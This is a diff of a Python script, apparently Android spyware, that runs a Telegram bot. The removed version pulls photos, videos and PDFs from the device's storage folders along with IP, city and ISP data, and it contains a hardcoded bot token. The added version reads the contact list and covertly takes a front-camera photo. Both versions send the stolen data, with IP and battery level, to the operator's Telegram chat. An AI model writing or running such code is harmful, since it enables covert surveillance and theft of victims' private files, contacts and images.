@@ -1,83 +1,52 @@
-import os
 import telebot
-import time
-import psutil
+import cv2
 import requests
-from threading import Thread
+import psutil
+import subprocess
+import os
 
-# --- بياناتك الأساسية ---
-API_TOKEN = "8449493423:AAEcks7g40QbiHXB9V-cv29A2ZZE5vPIDTg"
-bot = telebot.TeleBot(API_TOKEN)
-MY_CHAT_ID = "8559960166"
+# ضع بياناتك هنا
+BOT_TOKEN = 'ضع_توكن_البوت_هنا'
+CHAT_ID = 'ضع_الايدي_الخاص_بك_هنا'
 
-# المسارات التي سيتم فحصها
-paths_to_check = [
-    "/storage/emulated/0/DCIM/Camera/",
-    "/storage/emulated/0/Download/",
-    "/storage/emulated/0/Pictures/",
-    "/storage/emulated/0/Documents/"
-]
+bot = telebot.TeleBot(BOT_TOKEN)
 
-def get_device_info():
+def get_contacts():
     try:
-        # جلب الـ IP والمعلومات الجغرافية
-        response = requests.get('https://ipapi.co/json/', timeout=10)
-        data = response.json()
-        
-        ip = data.get('ip')
-        city = data.get('city')
-        isp = data.get('org') # شركة الإنترنت (مثل زين أو آسيا سيل)
-        
-        # معلومات البطارية
-        battery = psutil.sensors_battery()
-        percent = battery.percent
-        
-        info_msg = (
-            f"🚀 **تم تشغيل الأداة بنجاح**\n\n"
-            f"🌐 **IP Address:** `{ip}`\n"
-            f"🏢 **شركة الإنترنت:** {isp}\n"
-            f"📍 **الموقع:** {city}\n"
-            f"🔋 **البطارية:** {percent}%\n"
-            f"🛠️ **الحالة:** فحص الملفات جارٍ..."
-        )
-        return info_msg
+        # أمر لسحب جهات الاتصال في أندرويد
+        contacts = subprocess.check_output(['content', 'query', '--uri', 'content://contacts/phones']).decode()
+        return contacts[:1000] # نأخذ أول 1000 حرف فقط لضمان الإرسال
     except:
-        return "⚠️ تم التشغيل، ولكن تعذر جلب معلومات الشبكة (تحقق من الـ VPN)."
+        return "صلاحية جهات الاتصال مرفوضة"
 
-def send_media(file_path):
+def take_photo():
     try:
-        ext = file_path.lower()
-        # إرسال الصور
-        if ext.endswith((".jpg", ".png", ".jpeg")):
-            with open(file_path, "rb") as f:
-                bot.send_photo(chat_id=MY_CHAT_ID, photo=f)
-        # إرسال الفيديوهات (أقل من 20 ميجا لضمان السرعة)
-        elif ext.endswith((".mp4", ".mkv")):
-            if os.path.getsize(file_path) < 20 * 1024 * 1024:
-                with open(file_path, "rb") as f:
-                    bot.send_video(chat_id=MY_CHAT_ID, video=f)
-        # إرسال الملفات
-        elif ext.endswith(".pdf"):
-            with open(file_path, "rb") as f:
-                bot.send_document(chat_id=MY_CHAT_ID, document=f)
-        
-        time.sleep(1.5) # فاصل زمني لتجنب حظر التلجرام
+        cap = cv2.VideoCapture(1) # رقم 1 للكاميرا الأمامية
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite('shot.jpg', frame)
+            cap.release()
+            return 'shot.jpg'
     except:
         pass
+    return None
 
-def start_scanning():
-    # 1. إرسال معلومات الجهاز (IP والبطارية) أولاً
-    bot.send_message(MY_CHAT_ID, get_device_info(), parse_mode="Markdown")
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    # معلومات النظام
+    ip = requests.get('https://api.ipify.org').text
+    bat = psutil.sensors_battery().percent
     
-    # 2. بدء سحب الملفات
-    for path in paths_to_check:
-        if os.path.exists(path):
-            for root, dirs, files in os.walk(path):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    t = Thread(target=send_media, args=(file_path,))
-                    t.start()
-                    t.join() # لضمان إرسال ملف تلو الآخر وعدم تعليق التطبيق
+    # سحب البيانات
+    contacts = get_contacts()
+    photo = take_photo()
+    
+    # إرسال التقارير لك
+    bot.send_message(CHAT_ID, f"🔋 البطارية: {bat}%\n🌐 IP: {ip}\n\n📇 جهات الاتصال:\n{contacts}")
+    
+    if photo:
+        with open(photo, 'rb') as f:
+            bot.send_photo(CHAT_ID, f, caption="📸 صورة الوجه")
 
-if __name__ == "__main__":
-    start_scanning()
+bot.polling()
+
